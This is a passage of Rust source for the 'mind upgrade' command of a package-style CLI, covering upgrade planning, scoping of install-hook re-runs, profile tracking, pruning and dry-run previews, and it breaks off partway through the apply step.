//! `mind upgrade`.

use super::*;

/// What an upgrade pass does with an item new to a whole-tracked source
/// (LIFE-54) or newly in an enabled profile (PROF-21).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum NewItems {
    /// Propose it under the upgrade gate (the default).
    #[default]
    Install,
    /// `--skip-new`: leave it out of this run; it is offered again next time.
    Skip,
    /// `--ignore-new`: record it as seen without installing it.
    Ignore,
}

impl NewItems {
    /// The mode for the `--skip-new` / `--ignore-new` pair (clap rejects both).
    pub fn from_flags(skip: bool, ignore: bool) -> Self {
        if skip {
            NewItems::Skip
        } else if ignore {
            NewItems::Ignore
        } else {
            NewItems::Install
        }
    }
}

/// `mind upgrade` as the invoked verb: run one pass (see [`UpgradeOpts`]) and
/// print its `--json` result.
///
/// Callers that fold the pass into a result of their own (`sync --upgrade`,
/// `learn`, the homes move) call [`upgrade_pass`] instead.
pub fn upgrade(paths: &Paths, opts: UpgradeOpts<'_>) -> Result<()> {
    emit_upgrade_result(upgrade_pass(paths, opts)?)
}

/// Resolve `upgrade`'s positional target (CLI-262): an item filter as before
/// (CLI-63..65), or, when it matches no installed item but does match a
/// melded source, the `--source` filter (CLI-244). An item match wins, with a
/// note naming the `--source` spelling. Returns `(item, source)`.
// spec: CLI-262
pub fn upgrade_target(
    paths: &Paths,
    item: Option<String>,
    source: Option<String>,
) -> Result<(Option<String>, Option<String>)> {
    let (Some(target), None) = (item.as_deref(), source.as_deref()) else {
        return Ok((item, source));
    };
    if crate::resolve::validate_source_selector(target).is_err() {
        return Ok((item, source));
    }
    let registry = Registry::load(paths)?;
    if !registry
        .sources
        .iter()
        .any(|s| crate::resolve::source_matches_glob(&s.name, target))
    {
        return Ok((item, source));
    }
    let names_item = match parse_item_ref(target) {
        Ok(parsed) => Manifest::load(paths)?
            .items
            .values()
            .any(|it| crate::resolve::installed_matches_glob(it, &parsed)),
        Err(_) => false,
    };
    if names_item {
        // A glob (`mind upgrade '*'`) was written as an item filter; only a
        // plain name can be meant as the source it also names.
        if crate::resolve::is_glob(target) {
            return Ok((item, source));
        }
        eprintln!(
            "note: {} also names a melded source; `mind upgrade --source {}` upgrades that source",
            strip_ansi(target),
            crate::error::shell_quote(target)
        );
        return Ok((item, source));
    }
    Ok((None, Some(target.to_string())))
}

/// Emit an upgrade pass's result when `upgrade` was the verb the user invoked.
///
/// [`upgrade_pass`] RETURNS its `--json` result rather than printing it,
/// because it is also the `--upgrade` pass inside `sync`, where the caller
/// invoked `sync` and CLI-217 allows exactly one document. Only [`upgrade`] --
/// the real `upgrade` verb -- prints it.
// spec: CLI-217
fn emit_upgrade_result(result: Option<MutationResult>) -> Result<()> {
    match result {
        Some(r) => print_json(&r),
        None => Ok(()),
    }
}

/// Which sources an upgrade pass may touch (CLI-232, CLI-244).
#[derive(Clone, Copy)]
pub(crate) enum SourceScope<'a> {
    /// Every source: an unscoped `mind upgrade`.
    All,
    /// Names the caller already resolved, plus the filter text that produced
    /// them when there is one (`sync <source> --upgrade`; `curate` has none).
    /// `curate` passes its curated set (CUR-6), so an item installed from a
    /// directly-melded source is never touched by a command about curated
    /// ones.
    Names(&'a [String], Option<&'a str>),
    /// An `upgrade --source <filter>` (CLI-244), resolved against the registry
    /// the pass itself loads (CLI-231 matching).
    Filter(&'a str),
}

/// How one upgrade pass runs. `sources` restricts the pre-pass fetch, the
/// per-item delta loop, AND the HOOK-11 install-hook re-run to the scoped
/// sources (CLI-232, CLI-244), so `sync <source> --upgrade` or `upgrade
/// --source` cannot silently upgrade items from (or re-run install hooks
/// for) a source the caller never named. Its filter text, when there is one,
/// is echoed in the CLI-234/CLI-235 disclosure (M19), alongside `item_ref`,
/// which doubles as its own filter text.
#[derive(Clone, Copy)]
pub(crate) struct UpgradeOpts<'a> {
    pub(crate) yes: bool,
    pub(crate) item_ref: Option<&'a str>,
    /// Skip the pre-pass fetch (CLI-169): `--no-sync`, or a caller that has
    /// already fetched (`curate`, CUR-2; `sync --upgrade`).
    pub(crate) no_sync: bool,
    pub(crate) sources: SourceScope<'a>,
    /// Restrict the pass to these exact item KEYS (`kind:name`) rather than
    /// the glob `item_ref` restricts by; `None` is unrestricted.
    ///
    /// The TUI's `u` action applies through this (TUI-72, TUI-73): `app.rs`'s
    /// `initiate_upgrade` stashes the exact keys its confirm modal listed, so
    /// the applied set equals the confirmed set BY CONSTRUCTION rather than by
    /// two independent computations happening to agree. A confirmed key that
    /// is no longer applicable by the time the pass runs (forgotten, its
    /// source unmelded, or no longer out of date) is silently skipped, exactly
    /// like an out-of-scope item is for a glob-filtered `mind upgrade <item>`:
    /// the confirm-to-apply window is real and a benign race must not abort
    /// the whole batch.
    // spec: TUI-72 TUI-73
    pub(crate) keys: Option<&'a [String]>,
    pub(crate) accept: crate::hook::Accept,
    /// `upgrade --dry-run` (CLI-263): report what the pass would do, from the
    /// current checkouts, and change nothing.
    pub(crate) preview: bool,
    /// `upgrade --allow-breaking` (VER-63): take every in-scope breaking
    /// release without asking.
    pub(crate) allow_breaking: bool,
    /// `--skip-new` / `--ignore-new` on `upgrade` and `sync --upgrade`
    /// (LIFE-55).
    pub(crate) new_items: NewItems,
}

impl<'a> UpgradeOpts<'a> {
    /// An unscoped, applying pass that syncs first (CLI-169).
    pub(crate) fn new(yes: bool, accept: crate::hook::Accept) -> Self {
        UpgradeOpts {
            yes,
            item_ref: None,
            no_sync: false,
            sources: SourceScope::All,
            keys: None,
            accept,
            preview: false,
            allow_breaking: false,
            new_items: NewItems::Install,
        }
    }
}

/// The upgrade pass: [`plan_upgrade`] computes what is pending, then
/// [`preview_upgrade`] reports it (`--dry-run`) or [`apply_upgrade`] confirms
/// and applies it. Returns the `--json` result object (`None` in text mode, or
/// when the pass ended on a path with nothing to report) for the caller to
/// emit or fold into its own; see [`emit_upgrade_result`].
pub(super) fn upgrade_pass(paths: &Paths, opts: UpgradeOpts<'_>) -> Result<Option<MutationResult>> {
    // spec: HOOK-181 -- the plan's answer lasts for this pass only.
    let _answers = crate::consent::scope();
    let plan = plan_upgrade(paths, &opts)?;
    // spec: CLI-263 -- stop before consent or any hooks or installs. The
    // tracking routines in the plan compute the same selections without
    // saving them.
    if opts.preview {
        preview_upgrade(paths, opts.accept, plan)?;
        return Ok(None);
    }
    apply_upgrade(paths, &opts, plan)
}

/// What an upgrade pass found pending, computed by [`plan_upgrade`] before
/// anything is confirmed, and consumed by [`preview_upgrade`] or
/// [`apply_upgrade`].
struct UpgradePlan {
    policy: Option<Policy>,
    registry: Registry,
    manifest: Manifest,
    catalog: Vec<CatalogItem>,
    unscannable: Vec<String>,
    hook_scope: Option<HashSet<String>>,
    multi_source_note: Option<String>,
    source_plan: Vec<crate::consent::PlannedHook>,
    tracking: ProfileTracking,
    whole: WholeTracking,
    ignored: Vec<NewItem>,
    pending: Vec<Upgrade>,
    prunes: Vec<crate::manifest::InstalledItem>,
    left_prunes: Vec<crate::manifest::InstalledItem>,
    version_rows: Vec<SourceVersionJson>,
    breaking_moves: Vec<BreakingMoveJson>,
    home_moves: Vec<HomeMoveJson>,
}

/// The sources whose pending items hooks a plan lists (HOOK-198): the
/// HOOK-11 scope, or every source.
fn sources_in_scope(registry: &Registry, hook_scope: Option<&HashSet<String>>) -> Vec<String> {
    registry
        .sources
        .iter()
        .map(|s| s.name.clone())
        .filter(|n| hook_scope.is_none_or(|s| s.contains(n)))
        .collect()
}

/// Settle breaking releases, follow declared homes, track profiles and whole
/// sources, and compute each in-scope item's delta. Under `opts.preview`
/// nothing is saved.
fn plan_upgrade(paths: &Paths, opts: &UpgradeOpts<'_>) -> Result<UpgradePlan> {
    let UpgradeOpts {
        yes,
        item_ref,
        no_sync,
        sources: source_scope,
        keys: key_scope,
        accept,
        preview,
        allow_breaking,
        new_items: mode,
    } = *opts;
    let out = crate::render::ctx();
    // POL-3: load the managed policy once (fail closed on Err; None = inert).
    let policy = paths.settings().policy()?;
    // spec: LIFE-53 -- before the fetch below can bring in new items, mark the
    // sources whose items are all installed, so those items read as new.
    if !preview {
        record_whole_sources(paths, None)?;
    }
    let mut registry = Registry::load(paths)?;

    let (source_scope, source_filter_desc): (Option<HashSet<String>>, Option<&str>) =
        match source_scope {
            SourceScope::All => (None, None),
            SourceScope::Names(names, desc) => (Some(names.iter().cloned().collect()), desc),
            // spec: CLI-244 -- the same filter `sync <source>` takes (CLI-231).
            SourceScope::Filter(sel) => {
                crate::resolve::validate_source_selector(sel)?;
                let names = select_sources(&registry, sel)?;
                (Some(names.into_iter().collect()), Some(sel))
            }
        };

    // spec: CLI-169 - sync each involved source before computing deltas, unless
    // --no-sync is given. Per-source failures are reported and skipped (CLI-54);
    // the upgrade pass runs on the sources that did succeed.
    // spec: CLI-244 -- a source scope narrows the fetch too, so `upgrade
    // --source <filter>` syncs only the sources it names.
    if !no_sync {
        sync_sources_for_upgrade_scoped(
            paths,
            &mut registry,
            item_ref,
            source_scope.as_ref(),
            &out,
        )?;
    }

    let manifest = Manifest::load(paths)?;

    let filter = item_ref.map(parse_item_ref).transpose()?;
    // spec: TUI-72 TUI-73 - the TUI's confirmed-key scope (exact `kind:name`
    // match), analogous to `source_scope` but by item identity rather than by
    // source or by `filter`'s glob.
    let key_scope: Option<HashSet<String>> = key_scope.map(|keys| keys.iter().cloned().collect());

    // HOOK-11 scope: a scoped `upgrade <item>` (or a scoped `sync <source>
    // --upgrade`, CLI-232, or a scoped TUI key-set apply, TUI-73) must not
    // re-run install hooks (arbitrary code) for sources unrelated to the
    // targeted item/source. When a filter is present, restrict the hook
    // re-run to sources that have at least one INSTALLED item matching the
    // filter (the same scoping the per-item loop uses via
    // `installed_matches_glob`); same for a key scope, restricted to sources
    // that have at least one installed item whose KEY is in the set; when a
    // source scope is present, intersect with it too (a `sync <source>
    // --upgrade` names the source directly). With none of the three, `None`
    // means every source is in scope, leaving the unscoped behavior unchanged.
    let from_filter: Option<HashSet<String>> = filter.as_ref().map(|f| {
        manifest
            .items
            .values()
            .filter(|it| crate::resolve::installed_matches_glob(it, f))
            .map(|it| it.source.clone())
            .collect::<HashSet<String>>()
    });
    let from_keys: Option<HashSet<String>> = key_scope.as_ref().map(|keys| {
        manifest
            .items
            .values()
            .filter(|it| keys.contains(it.key().as_str()))
            .map(|it| it.source.clone())
            .collect::<HashSet<String>>()
    });

    // spec: VER-62 -- breaking releases are settled before the pass, so an
    // accepted source's items upgrade through the ordinary path below. The
    // `[item]`/`--source` scoping narrows it like the rest (VER-63).
    let breaking_scope = |name: &str| {
        [&source_scope, &from_filter, &from_keys]
            .iter()
            .all(|s| s.as_ref().is_none_or(|s| s.contains(name)))
    };
    // spec: CLI-263 -- a preview lists them, unapplied.
    let breaking_moves = settle_breaking_moves(
        paths,
        &mut registry,
        &breaking_scope,
        yes,
        !preview && allow_breaking,
        preview,
        &out,
    )?;
    // spec: HOME-15 -- with each clone at its new commit, a source whose own
    // `mind-home` now names another home moves there, and the pass below
    // reinstalls its items in that home (HOME-8) and links them into the lobe
    // now in effect (LOBE-5). Only an unscoped or source-scoped pass moves a
    // source; an `upgrade <item>` names items.
    let mut home_moves = Vec::new();
    if filter.is_none() && key_scope.is_none() {
        let admits = |s: &crate::source::Source| {
            source_scope.as_ref().is_none_or(|sc| sc.contains(&s.name))
                && policy
                    .as_ref()
                    .is_none_or(|p| !p.lock() || p.allow_matches(&s.base_identity()))
        };
        // spec: CLI-263 -- a preview reports the moves instead.
        let (moved, predicted) = follow_declared_homes(paths, &registry, &admits, accept, preview)?;
        home_moves = predicted;
        if moved {
            registry = Registry::load(paths)?;
        }
    }
    // spec: VER-91 -- the `--json` result carries each in-scope version-pinned
    // source's release state, and the breaking moves apart from the applied
    // changes.
    let version_rows = source_versions(&registry, &breaking_scope);

    // spec: CLI-234 -- the multi-source disclosure's scope covers every
    // scoping mechanism in play (a filter, a source scope, or a key scope).
    // `CLI-233`'s original form derived the note's names from `source_scope`
    // alone (the `sync <filter> --upgrade` case only), so `upgrade
    // '<suffix>#*'` -- an identical HOOK-11 blast radius, every matched
    // source's items upgraded and its install hook possibly re-run -- never
    // populated it: `source_scope` is always `None` for a plain `upgrade
    // <item>` call, so `scope_names` stayed empty and the note never fired no
    // matter how many sources the item-ref filter actually matched.
    // spec: CLI-244 -- `upgrade <item> --source <filter>` combines two
    // mechanisms; the pass touches only the sources every one admits, so the
    // note names their intersection (the same set the HOOK-11 re-run is
    // scoped to), not the union, which would name a source the pass never
    // touches.
    let hook_scope: Option<HashSet<String>> = {
        let candidates: Vec<HashSet<String>> = [from_filter, source_scope.clone(), from_keys]
            .into_iter()
            .flatten()
            .collect();
        let mut candidates = candidates.into_iter();
        candidates
            .next()
            .map(|first| candidates.fold(first, |acc, c| acc.intersection(&c).cloned().collect()))
    };
    let scope_names: Vec<String> = {
        let mut v: Vec<String> = hook_scope.iter().flatten().cloned().collect();
        v.sort();
        v
    };
    // spec: CLI-235 CLI-244 -- the raw filter TEXT to echo in the note (M19):
    // an `item_ref` (the `upgrade <item>` case) doubles as its own filter
    // text, and `source_filter_desc` is the `sync <source>` / `upgrade
    // --source` string; both are quoted when both shaped the scope. Neither
    // exists for the TUI's key-scoped apply, which has no text to echo.
    let filter_desc: Vec<&str> = [item_ref, source_filter_desc]
        .into_iter()
        .flatten()
        .collect();
    let multi_source_note = multi_source_upgrade_note(&scope_names, &filter_desc);
    // spec: CLI-235 -- hoisted ABOVE `rerun_source_hooks` and unconditional on
    // `yes`/`pending` (M1: this used to print only from inside the `!yes`
    // confirmation block below, which is reached AFTER `rerun_source_hooks`
    // already ran -- future-tense wording ("possibly re-running") describing
    // a side effect already taken -- and only when a pending upgrade existed;
    // a re-run that found nothing pending, or any `--yes` run, never
    // disclosed the multi-source blast radius at all). Fires whenever the
    // scope spans more than one source, independent of `pending`/`yes`.
    // `--json`'s stdout carries exactly one JSON document (tests/json_stdout.rs),
    // so the disclosure goes to stderr there instead of stdout (also covers
    // `--json --yes`, which has no `ConfirmationRequired` to carry it at
    // all); text mode prints it directly. The `!yes` `--json` refusal further
    // below still folds this same note into `ConfirmationRequired.action`
    // (CLI-233, unchanged), so a `--json` caller without `--yes` sees it
    // through that channel too.
    if let Some(note) = &multi_source_note {
        if out.json {
            eprintln!("{} {note}", out.warn());
        } else {
            println!("  {} {note}", out.warn());
        }
    }

    // HOOK-11, HOOK-121, HOOK-122: each source's pending source-level hooks
    // for this update -- its update hooks when it declares any, else its
    // recorded install hooks -- when the commit has advanced past the commit the
    // hook last ran at (or it was recorded but never run). This is a
    // source-level pass, separate from the per-item upgrade loop below.
    //
    // spec: HOOK-180 HOOK-183 -- they are listed in the plan and run only after
    // it is answered (`run_source_pass` below), never before the pending
    // upgrades are shown.
    let source_plan = source_hooks_plan(
        paths,
        &registry,
        accept,
        hook_scope.as_ref(),
        policy.as_ref(),
    );

    // spec: CLI-211 -- a source that cannot be scanned (missing clone, or any
    // other per-source scan failure) must not silently drop its items out of
    // the delta computation and leave the run reporting "up to date". Scan
    // each source independently, name every one that failed, and remember
    // them so the final report cannot claim everything is up to date while a
    // source was never actually checked.
    let mut catalog: Vec<CatalogItem> = Vec::new();
    let mut unscannable: Vec<String> = Vec::new();
    for s in &registry.sources {
        // spec: LOBE-2 -- a lobe that is refused holds its source back like a
        // scan failure, so one source's lobe cannot stop the others' upgrades.
        let checked = catalog::scan_source(paths, s, &mut catalog)
            .and_then(|()| paths.source_lobe(&s.name).map(drop));
        if let Err(e) = checked {
            catalog.retain(|c| c.source != s.name);
            if preview
                && hook_scope
                    .as_ref()
                    .is_some_and(|scope| !scope.contains(&s.name))
            {
                continue;
            }
            unscannable.push(s.name.clone());
            if !out.json {
                let safe_e = strip_ansi(&e.to_string());
                eprintln!(
                    "{} could not check {}: {safe_e}; run `mind sync` or `mind introspect` to diagnose",
                    out.warn(),
                    s.name
                );
            }
        }
    }
    // spec: PROF-21 PROF-22 PROF-23 PROF-24 -- re-expand each profile-tracked
    // source's enabled set. Only an unscoped pass or a source-scoped one
    // (`sync <source> --upgrade`, `curate`) tracks profiles: an `upgrade
    // <item>` filter or the TUI's confirmed-key apply names items, and an
    // addition is by definition an item it did not name.
    let profile_sources: Vec<String> = if filter.is_none() && key_scope.is_none() {
        registry
            .sources
            .iter()
            .filter(|s| {
                s.is_profile_tracked()
                    && source_scope.as_ref().is_none_or(|sc| sc.contains(&s.name))
                    && !unscannable.contains(&s.name)
                    && policy
                        .as_ref()
                        .is_none_or(|p| !p.lock() || p.allow_matches(&s.base_identity()))
            })
            .map(|s| s.name.clone())
            .collect()
    } else {
        Vec::new()
    };
    // spec: PROF-39 -- the profile leftovers of a source that declares
    // `prune`, in the same scope as the profile tracking, computed before it
    // so the departures it reports can say they are being pruned.
    let leftover_keys: Vec<String> = if filter.is_none() && key_scope.is_none() {
        let candidates: Vec<&crate::source::Source> = registry
            .sources
            .iter()
            .filter(|s| {
                source_scope.as_ref().is_none_or(|sc| sc.contains(&s.name))
                    && !unscannable.contains(&s.name)
                    && policy
                        .as_ref()
                        .is_none_or(|p| !p.lock() || p.allow_matches(&s.base_identity()))
                    && manifest
                        .items
                        .values()
                        .any(|m| m.source == s.name && !m.profiles.is_empty())
                    && clone_dir_checked(paths, s).is_ok_and(|d| d.is_dir())
                    && declares_prune(paths, s)
            })
            .collect();
        let mut keys: Vec<String> = Vec::new();
        if !candidates.is_empty() {
            let graph = manifest_graph(&catalog, &manifest);
            for s in candidates {
                keys.extend(profile_leftovers(paths, &catalog, &manifest, &graph, s)?);
            }
        }
        keys
    } else {
        Vec::new()
    };
    let tracking = track_profiles_for_upgrade(
        paths,
        &profile_sources,
        &catalog,
        mode,
        &leftover_keys,
        preview,
    )?;
    // spec: LIFE-54 -- the same scoping for sources installed whole; a
    // profile-tracked source is tracked by its profiles instead.
    let whole_sources: Vec<String> = if filter.is_none() && key_scope.is_none() {
        registry
            .sources
            .iter()
            .filter(|s| {
                s.whole_snapshot.is_some()
                    && !s.is_profile_tracked()
                    && source_scope.as_ref().is_none_or(|sc| sc.contains(&s.name))
                    && !unscannable.contains(&s.name)
                    && policy
                        .as_ref()
                        .is_none_or(|p| !p.lock() || p.allow_matches(&s.base_identity()))
            })
            .map(|s| s.name.clone())
            .collect()
    } else {
        Vec::new()
    };
    let whole = track_whole_for_upgrade(paths, &whole_sources, &catalog, mode, preview)?;
    let ignored: Vec<NewItem> = tracking
        .ignored
        .iter()
        .chain(&whole.ignored)
        .cloned()
        .collect();
    if !out.json {
        note_unproposed_new_items(tracking.skipped + whole.skipped, &ignored, preview);
    }
    // Tracking may have persisted snapshot/tag changes; read them back so the
    // pass below (and its manifest save) starts from them.
    let manifest = if profile_sources.is_empty() && whole_sources.is_empty() {
        manifest
    } else {
        registry = Registry::load(paths)?;
        Manifest::load(paths)?
    };

    let mut pending: Vec<Upgrade> = Vec::new();
    // spec: LIFE-57 -- installed items of a source that declares `prune` and
    // no longer offers them, removed by this pass.
    let mut prunes: Vec<crate::manifest::InstalledItem> = Vec::new();
    let mut prune_sources: std::collections::HashMap<String, bool> =
        std::collections::HashMap::new();
    // spec: PROF-39 -- installed items its enabled profiles no longer want,
    // of a source that declares `prune`.
    let mut left_prunes: Vec<crate::manifest::InstalledItem> = Vec::new();

    for installed in manifest.items.values() {
        match upgrade_item_disposition(
            installed,
            filter.as_ref(),
            source_scope.as_ref(),
            key_scope.as_ref(),
            policy.as_ref(),
            &registry,
        ) {
            // Out of the scoped selection: silent skip, no output.
            UpgradeDisposition::OutOfScope => continue,
            // POL-12: in-scope but the source is no longer allowed by the locked
            // allowlist; report and skip. The item-ref filter is checked first,
            // so a scoped upgrade never emits skip lines for out-of-scope sources
            // the user never selected.
            UpgradeDisposition::PolicyBlocked => {
                if !out.json {
                    // spec: DSC-95
                    println!(
                        "{} skipping {} from {}: source not permitted by the managed policy's allowlist",
                        out.warn(),
                        installed.display_key(),
                        strip_ansi(&installed.source)
                    );
                }
                continue;
            }
            // spec: POL-69 -- the item's recorded source isn't registered at
            // all (it was unmelded, or never melded under that name); say so
            // instead of the misleading "not permitted by the allowlist",
            // and point at `introspect` to diagnose the drift.
            UpgradeDisposition::SourceNotRegistered => {
                if !out.json {
                    // spec: DSC-95
                    println!(
                        "{} skipping {} from {}: source is not registered (not currently melded); run `mind introspect` to check for drift",
                        out.warn(),
                        installed.display_key(),
                        strip_ansi(&installed.source)
                    );
                }
                continue;
            }
            UpgradeDisposition::Consider => {}
        }
        // spec: PROF-39 -- a profile leftover is pruned below, not upgraded.
        if leftover_keys.iter().any(|k| *k == installed.key().as_str()) {
            left_prunes.push(installed.clone());
            continue;
        }
        // Match on stable identity (source, kind, bare_name) so a prefix change
        // is seen as a rename of the same item, not an orphan-plus-new-item.
        let Some(cat) = catalog.iter().find(|c| {
            c.kind == installed.kind
                && c.name == installed.bare_name
                && c.source == installed.source
        }) else {
            // Source dropped or item removed upstream; reported by introspect,
            // and pruned here when the source declares `prune` (LIFE-57). A
            // source that could not be scanned, or has no clone, says nothing
            // about what it dropped.
            if let Some(s) = registry.find(&installed.source)
                && !unscannable.contains(&s.name)
                // spec: DSC-123 -- skipped for an unreadable manifest, so
                // still shipped.
                && !catalog::dropped_as_unreadable(
                    &installed.source,
                    installed.kind,
                    &installed.bare_name,
                )
                && clone_dir_checked(paths, s).is_ok_and(|d| d.is_dir())
                && *prune_sources
                    .entry(s.name.clone())
                    .or_insert_with(|| declares_prune(paths, s))
            {
                prunes.push(installed.clone());
            }
            continue;
        };
        let new_hash = cat.content_hash()?;
        let new_name = cat.effective_name();
        let new_commit = registry
            .find(&installed.source)
            .and_then(|s| s.commit.clone())
            .unwrap_or_default();
        let renamed = new_name != installed.name;
        // spec: HOME-8 -- an item whose source moved homes is reinstalled in
        // the new one even when its content is unchanged.
        let home_move = item_in_other_home(paths, installed).then(|| {
            (
                paths.home_of_item_store(&installed.store),
                paths.home_of(&installed.source),
            )
        });
        // spec: LOBE-5 -- links not where the source's lobe puts them.
        let relink = links_misplaced(paths, installed, cat)?;
        if new_hash != installed.hash || renamed || home_move.is_some() || relink.is_some() {
            pending.push(Upgrade {
                cat: cat.clone(),
                old: installed.clone(),
                new_commit,
                new_hash,
                new_name,
                home_move,
                relink,
            });
        }
    }
    prunes.sort_by_key(|i| i.key());
    left_prunes.sort_by_key(|i| i.key());
    warn_apparent_breaks(
        &registry,
        &manifest,
        &catalog,
        hook_scope.as_ref(),
        &prunes,
        &out,
    );

    // spec: LIFE-46 -- B2: a rename must never evict a DIFFERENT item that
    // already occupies the new effective key. A third-party source edit (e.g.
    // dropping its prefix) can otherwise make one source's upgrade delete
    // another source's installed item -- no hook, no prompt (verified: two
    // sources both shipping a `review` skill, one prefixed). Mirror `learn`'s
    // `colliding_install` guard (DEP-23/NS-41): refuse rather than clobber
    // when the manifest already holds a DIFFERENT stable identity
    // `(source, kind, bare_name)` under the rename's target key.
    Ok(UpgradePlan {
        policy,
        registry,
        manifest,
        catalog,
        unscannable,
        hook_scope,
        multi_source_note,
        source_plan,
        tracking,
        whole,
        ignored,
        pending,
        prunes,
        left_prunes,
        version_rows,
        breaking_moves,
        home_moves,
    })
}

/// Report what [`plan_upgrade`] found, with the hooks and dependencies the
/// pass would run and install (CLI-263). Changes nothing.
fn preview_upgrade(paths: &Paths, accept: crate::hook::Accept, plan: UpgradePlan) -> Result<()> {
    let out = crate::render::ctx();
    let UpgradePlan {
        registry,
        manifest,
        catalog,
        unscannable,
        hook_scope,
        source_plan,
        tracking,
        whole,
        ignored,
        pending,
        prunes,
        left_prunes,
        breaking_moves,
        home_moves,
        ..
    } = plan;
    validate_upgrade_collisions(&pending, &manifest)?;
    let mut hooks = source_plan.clone();
    for up in &pending {
        let is_update = up.new_name == up.old.name;
        hooks.extend(item_install_plan(
            paths, &registry, &up.cat, is_update, accept,
        ));
        if !is_update {
            hooks.extend(item_uninstall_plan(
                paths,
                &up.old,
                &up.cat.uninstall_hooks(),
                &up.old.commit,
                accept,
            ));
        }
    }
    for item in &left_prunes {
        let item_hooks = item_catalog_match(&catalog, item)
            .map(|c| c.uninstall_hooks())
            .unwrap_or_default();
        let commit = registry
            .find(&item.source)
            .and_then(|s| s.commit.clone())
            .unwrap_or_default();
        hooks.extend(item_uninstall_plan(
            paths,
            item,
            &item_hooks,
            &commit,
            accept,
        ));
    }
    // spec: CLI-263 -- the additions install through the learn path, so
    // their dependency closures and install hooks are predicted from it.
    let mut closure: Vec<CatalogItem> = Vec::new();
    {
        let mut seen: HashSet<(String, String)> = HashSet::new();
        let mut take = |it: CatalogItem| {
            if seen.insert((it.source.clone(), it.key().as_str().to_string())) {
                closure.push(it);
            }
        };
        let targets: Vec<&LearnTarget> = whole.targets.iter().flat_map(|(_, t)| t.iter()).collect();
        for plan in learn_plans(paths, &targets)? {
            plan.items.into_iter().for_each(&mut take);
        }
        for (source_name, plan) in &tracking.plans {
            for key in &plan.pending {
                if let Some(it) = catalog
                    .iter()
                    .find(|c| c.source == *source_name && c.key().as_str() == key)
                {
                    take(it.clone());
                }
            }
        }
    }
    let named: HashSet<(&str, &str)> = whole
        .additions
        .iter()
        .map(|a| (a.source.as_str(), a.key.as_str()))
        .chain(
            tracking
                .additions
                .iter()
                .map(|a| (a.source.as_str(), a.key.as_str())),
        )
        .collect();
    let dependencies: Vec<String> = closure
        .iter()
        .filter(|it| !named.contains(&(it.source.as_str(), it.key().as_str())))
        .map(CatalogItem::display_key)
        .collect();
    for it in &closure {
        hooks.extend(item_install_plan(paths, &registry, it, false, accept));
    }
    let touched: HashSet<&str> = pending
        .iter()
        .map(|u| u.cat.source.as_str())
        .chain(prunes.iter().chain(&left_prunes).map(|i| i.source.as_str()))
        .chain(closure.iter().map(|it| it.source.as_str()))
        .collect();
    let scoped = sources_in_scope(&registry, hook_scope.as_ref());
    for source in &registry.sources {
        let when = if touched.contains(source.name.as_str()) {
            crate::items_hook::PlanWhen::Touched
        } else if scoped.contains(&source.name) {
            crate::items_hook::PlanWhen::Pending
        } else {
            continue;
        };
        hooks.extend(crate::items_hook::planned(
            paths,
            &registry,
            [source.name.as_str()],
            when,
            accept,
        ));
    }
    if out.json {
        let items: Vec<_> = pending.iter().map(|u| serde_json::json!({
            "key": u.old.display_key(), "source": strip_ansi(&u.old.source),
            "new_name": strip_ansi(&u.new_name), "links": u.old.links.iter().map(|s| strip_ansi(s)).collect::<Vec<_>>()
        })).collect();
        let hook_rows: Vec<_> = hooks.iter().map(|h| serde_json::json!({
            "source": strip_ansi(&h.key.source), "item": h.key.item.as_ref().map(|v| strip_ansi(v)),
            "event": strip_ansi(&h.key.event), "command": strip_ansi(&h.label),
        })).collect();
        print_json(
            &serde_json::json!({"schema": 1, "action": "upgrade", "outcome": "preview",
            "basis": "current checkouts", "upgrades": items,
            "prunes": prunes.iter().chain(&left_prunes).map(|i| i.display_key()).collect::<Vec<_>>(),
            "profile_additions": tracking.additions, "profile_departures": tracking.departures,
            "new_items": whole.additions, "ignored_new_items": ignored, "unscannable": unscannable.iter().map(|s| strip_ansi(s)).collect::<Vec<_>>(),
            "dependencies": dependencies, "breaking": breaking_moves, "home_moves": home_moves,
            "hooks": hook_rows,
            "limitations": "No fetch, content diff or build output is predicted."}),
        )?;
    } else {
        println!("Preview based on current checkouts; no fetch or hooks run.");
        print_upgrade_report(paths, &registry, &pending, &tracking);
        print_whole_additions(&whole);
        print_prunes(&prunes);
        print_left_prunes(&left_prunes);
        if !dependencies.is_empty() {
            println!(
                "Dependencies the additions would also install: {}",
                dependencies.join(", ")
            );
        }
        if !hooks.is_empty() {
            print!("{}", crate::consent::render(&hooks));
        }
        if !unscannable.is_empty() {
            println!(
                "Could not check: {}",
                unscannable
                    .iter()
                    .map(|s| strip_ansi(s))
                    .collect::<Vec<_>>()
                    .join(", ")
            );
        }
        if pending.is_empty()
            && prunes.is_empty()
            && left_prunes.is_empty()
            && !tracking.has_additions()
            && whole.targets.is_empty()
            && home_moves.is_empty()
            && hooks.is_empty()
            && unscannable.is_empty()
        {
            println!("everything is up to date");
        }
        println!("Not predicted: content diffs or build output.");
    }
    Ok(())
}

/// Confirm the plan (with its hooks), run the source hooks, then apply the
/// upgrades, prunes, and additions, and report the result.
fn apply_upgrade(
    paths: &Paths,
    opts: &UpgradeOpts<'_>,
    plan: UpgradePlan,
) -> Result<Option<MutationResult>> {
    let out = crate::render::ctx();
    let UpgradeOpts {
        yes,
        item_ref,
        accept,
        ..
    } = *opts;
    let UpgradePlan {
        policy,
        mut registry,
        manifest,
        catalog,
        unscannable,
        hook_scope,
        multi_source_note,
        source_plan,
        tracking,
        whole,
        ignored,
        pending,
        prunes,
        left_prunes,
        version_rows,
        breaking_moves,
        home_moves: _,
    } = plan;
    let target = item_ref.unwrap_or("all");
    let with_profiles = |mut r: MutationResult| {
        r.profile_additions = tracking.additions.clone();
        r.profile_departures = tracking.departures.clone();
        // spec: LIFE-56
        r.new_items = whole.additions.clone();
        r.ignored_new_items = ignored.clone();
        r.sources = version_rows.clone();
        r.breaking = breaking_moves.clone();
        r
    };

    if pending.is_empty()
        && prunes.is_empty()
        && left_prunes.is_empty()
        && !tracking.has_additions()
        && whole.targets.is_empty()
    {
        // spec: HOOK-182 -- no item to upgrade, but a source hook may still be
        // pending: a hooks-only plan, then the pass.
        // spec: HOOK-198 -- an items hook left pending earlier is caught up.
        let mut source_plan = source_plan;
        source_plan.extend(crate::items_hook::planned(
            paths,
            &registry,
            sources_in_scope(&registry, hook_scope.as_ref()),
            crate::items_hook::PlanWhen::Pending,
            accept,
        ));
        ask_plan(paths, None, source_plan)?;
        rerun_source_hooks(
            paths,
            &mut registry,
            accept,
            hook_scope.as_ref(),
            policy.as_ref(),
        )?;
        // spec: CLI-211 -- an unscannable source makes "up to date" a lie: the
